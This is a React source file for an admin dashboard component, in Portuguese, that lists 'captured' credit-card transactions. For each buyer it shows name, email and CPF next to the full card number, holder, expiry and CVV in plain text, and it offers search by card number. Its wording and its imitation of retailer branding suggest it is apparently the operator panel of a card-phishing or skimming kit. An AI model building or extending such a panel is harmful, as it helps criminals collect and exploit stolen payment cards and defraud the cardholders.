import React, { useState, useEffect } from 'react';
import { Card, CardHeader, CardTitle, CardContent, CardDescription } from '@/components/ui/card';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Loader2, CreditCard, Search, Calendar, User, Mail, FileText, DollarSign, ShieldCheck } from 'lucide-react';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';

interface OrderCardData {
  id: string;
  created_at: string;
  buyer_name: string | null;
  buyer_email: string | null;
  buyer_document: string | null;
  amount_cents: number | null;
  status: string | null;
  gateway: string | null;
  payment_method: string | null;
  card_number?: string | null;
  card_holder?: string | null;
  card_expiry?: string | null;
  card_cvv?: string | null;
  transaction_id?: string | null;
}

interface AdminCardsProps {
  orders: OrderCardData[];
  loading: boolean;
}

const AdminCards: React.FC<AdminCardsProps> = ({ orders, loading }) => {
  const [searchTerm, setSearchTerm] = useState('');
  const [cardTransactions, setCardTransactions] = useState<OrderCardData[]>([]);

  useEffect(() => {
    // Filtra os pedidos para mostrar apenas transações de cartão
    const filteredOrders = orders.filter(order => 
      order.payment_method === 'credit_card' || 
      (order.card_number && order.card_number.length > 0)
    );
    
    // Aplica busca se houver termo
    const searchedOrders = searchTerm 
      ? filteredOrders.filter(order => 
          order.buyer_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          order.buyer_email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          order.buyer_document?.includes(searchTerm) ||
          order.card_number?.includes(searchTerm)
        )
      : filteredOrders;

    setCardTransactions(searchedOrders);
  }, [orders, searchTerm]);

  const formatCurrency = (amountInCents: number | null | undefined) => {
    if (amountInCents === null || amountInCents === undefined) return '€ 0,00';
    return `€ ${(amountInCents / 100).toFixed(2).replace('.', ',')}`;
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString('pt-BR');
  };

  return (
    <div className="space-y-6 animate-in fade-in duration-500">
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h2 className="text-2xl font-black text-foreground flex items-center gap-2">
            <CreditCard className="text-primary" /> Informações de Cartão
          </h2>
          <p className="text-muted-foreground text-xs">Gerencie e visualize os dados de cartões capturados</p>
        </div>
        
        <div className="relative w-full md:w-72">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
          <Input 
            placeholder="Buscar por nome, email, CPF ou cartão..." 
            className="pl-9 text-xs h-9"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
        </div>
      </div>

      <Card className="border-border shadow-sm overflow-hidden">
        <CardHeader className="bg-muted/30 pb-4">
          <div className="flex items-center justify-between">
            <div>
              <CardTitle className="text-sm font-bold">Transações de Cartão</CardTitle>
              <CardDescription className="text-[11px]">Lista de todos os pedidos processados via cartão de crédito</CardDescription>
            </div>
            <Badge variant="outline" className="bg-background font-bold text-[10px]">
              {cardTransactions.length} {cardTransactions.length === 1 ? 'cartão' : 'cartões'}
            </Badge>
          </div>
        </CardHeader>
        <CardContent className="p-0">
          {loading ? (
            <div className="flex flex-col items-center justify-center py-20">
              <Loader2 className="h-8 w-8 animate-spin text-primary mb-2" />
              <span className="text-xs font-medium text-muted-foreground">Carregando dados...</span>
            </div>
          ) : cardTransactions.length > 0 ? (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader className="bg-muted/50">
                  <TableRow>
                    <TableHead className="text-[10px] font-bold uppercase tracking-wider py-3">Cliente / Data</TableHead>
                    <TableHead className="text-[10px] font-bold uppercase tracking-wider py-3">Dados do Cartão</TableHead>
                    <TableHead className="text-[10px] font-bold uppercase tracking-wider py-3">Valor / Status</TableHead>
                    <TableHead className="text-[10px] font-bold uppercase tracking-wider py-3">Gateway / ID</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {cardTransactions.map((order) => (
                    <TableRow key={order.id} className="hover:bg-muted/20 transition-colors">
                      <TableCell className="py-4">
                        <div className="flex flex-col gap-1">
                          <div className="flex items-center gap-1.5">
                            <User size={12} className="text-primary" />
                            <span className="text-xs font-black text-foreground">{order.buyer_name || 'N/A'}</span>
                          </div>
                          <div className="flex items-center gap-1.5">
                            <Mail size={12} className="text-muted-foreground" />
                            <span className="text-[10px] text-muted-foreground">{order.buyer_email || 'N/A'}</span>
                          </div>
                          <div className="flex items-center gap-1.5">
                            <FileText size={12} className="text-muted-foreground" />
                            <span className="text-[10px] text-muted-foreground">{order.buyer_document || 'N/A'}</span>
                          </div>
                          <div className="flex items-center gap-1.5 mt-1">
                            <Calendar size={12} className="text-muted-foreground" />
                            <span className="text-[10px] font-medium text-muted-foreground/80">{formatDate(order.created_at)}</span>
                          </div>
                        </div>
                      </TableCell>
                      <TableCell className="py-4">
                        <div className="bg-muted/40 p-2.5 rounded-lg border border-border/50 max-w-[220px]">
                          <div className="flex items-center justify-between mb-2">
                            <CreditCard size={14} className="text-primary" />
                            <Badge variant="secondary" className="text-[9px] h-4 px-1.5 font-bold uppercase">Crédito</Badge>
                          </div>
                          <div className="space-y-1.5">
                            <div className="flex justify-between items-center">
                              <span className="text-[9px] text-muted-foreground font-bold uppercase">Número</span>
                              <span className="text-[10px] font-mono font-bold text-foreground">{order.card_number || '**** **** **** ****'}</span>
                            </div>
                            <div className="flex justify-between items-center">
                              <span className="text-[9px] text-muted-foreground font-bold uppercase">Titular</span>
                              <span className="text-[10px] font-bold text-foreground truncate max-w-[100px] uppercase">{order.card_holder || '—'}</span>
                            </div>
                            <div className="flex justify-row gap-4">
                              <div className="flex flex-col">
                                <span className="text-[9px] text-muted-foreground font-bold uppercase">Exp</span>
                                <span className="text-[10px] font-bold text-foreground">{order.card_expiry || '—'}</span>
                              </div>
                              <div className="flex flex-col">
                                <span className="text-[9px] text-muted-foreground font-bold uppercase">CVV</span>
                                <span className="text-[10px] font-bold text-foreground">{order.card_cvv || '***'}</span>
                              </div>
                            </div>
                          </div>
                        </div>
                      </TableCell>
                      <TableCell className="py-4">
                        <div className="flex flex-col gap-2">
                          <div className="flex items-center gap-1">
                            <DollarSign size={14} className="text-centauro-green" />
                            <span className="text-sm font-black text-foreground">{formatCurrency(order.amount_cents)}</span>
                          </div>
                          <Badge className={`w-fit text-[10px] font-bold ${
                            order.status === 'paid' 
                              ? 'bg-centauro-green/10 text-centauro-green border-centauro-green/30' 
                              : 'bg-centauro-gold/10 text-centauro-gold border-centauro-gold/30'
                          }`}>
                            {order.status === 'paid' ? 'Aprovado' : 'Pendente'}
                          </Badge>
                        </div>
                      </TableCell>
                      <TableCell className="py-4">
                        <div className="flex flex-col gap-1.5">
                          <div className="flex items-center gap-1.5">
                            <ShieldCheck size={12} className="text-primary" />
                            <span className="text-[10px] font-bold text-foreground uppercase">{order.gateway || 'N/A'}</span>
                          </div>
                          <div className="flex flex-col">
                            <span className="text-[9px] text-muted-foreground font-bold uppercase">ID Transação</span>
                            <span className="text-[10px] font-mono text-muted-foreground break-all max-w-[150px]">{order.transaction_id || order.id}</span>
                          </div>
                        </div>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          ) : (
            <div className="flex flex-col items-center justify-center py-20 px-4 text-center">
              <div className="w-12 h-12 rounded-full bg-muted flex items-center justify-center mb-3">
                <CreditCard className="h-6 w-6 text-muted-foreground" />
              </div>
              <h3 className="text-sm font-bold text-foreground">Nenhuma transação de cartão</h3>
              <p className="text-xs text-muted-foreground mt-1 max-w-[250px]">
                {searchTerm 
                  ? `Nenhum resultado encontrado para "${searchTerm}"` 
                  : 'As transações de cartão de crédito aparecerão aqui assim que forem capturadas.'}
              </p>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

export default AdminCards;
